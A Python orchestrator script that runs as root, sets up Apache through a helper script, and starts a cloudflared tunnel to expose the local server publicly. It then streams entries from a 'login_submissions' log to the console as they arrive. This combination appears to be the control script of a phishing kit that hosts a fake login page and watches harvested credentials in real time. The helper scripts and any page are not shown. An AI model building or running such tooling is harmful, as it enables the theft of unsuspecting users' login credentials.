#!/usr/bin/env python3
"""
main.py - Orchestrator to: setup apache, start cloudflared, and show login submissions live.

Usage: sudo python3 main.py
"""

import subprocess, os, signal, sys, time

if os.geteuid() != 0:
    print("Please run as root: sudo python3 main.py")
    sys.exit(2)

SETUP = "./setup_apache.sh"
CF = "./cloudflare_tunnel.sh"
STOP = "./stop_services.sh"
LOGFILE = "/tmp/login_submissions.log"

def run_setup():
    print("Running Apache setup...")
    subprocess.check_call(["bash", SETUP])
    # ensure logfile exists
    open(LOGFILE, "a").close()

def start_cloudflared():
    print("Starting cloudflared tunnel (background)...")
    subprocess.check_call(["bash", CF])

def stop_all():
    print("\nStopping services...")
    try:
        subprocess.check_call(["bash", STOP])
    except Exception as e:
        print("Error stopping services:", e)

def tail_log():
    print(f"Following login submissions in {LOGFILE} (Ctrl+C to stop).")
    # use tail -F for portability and to show appended lines live
    p = subprocess.Popen(["tail", "-F", LOGFILE], stdout=subprocess.PIPE, text=True)
    try:
        while True:
            line = p.stdout.readline()
            if not line:
                time.sleep(0.1)
                continue
            print(line, end='')
    except KeyboardInterrupt:
        p.terminate()
        p.wait()
        raise

def main():
    try:
        run_setup()
        start_cloudflared()
        tail_log()
    except KeyboardInterrupt:
        pass
    finally:
        stop_all()

if __name__ == "__main__":
    main()
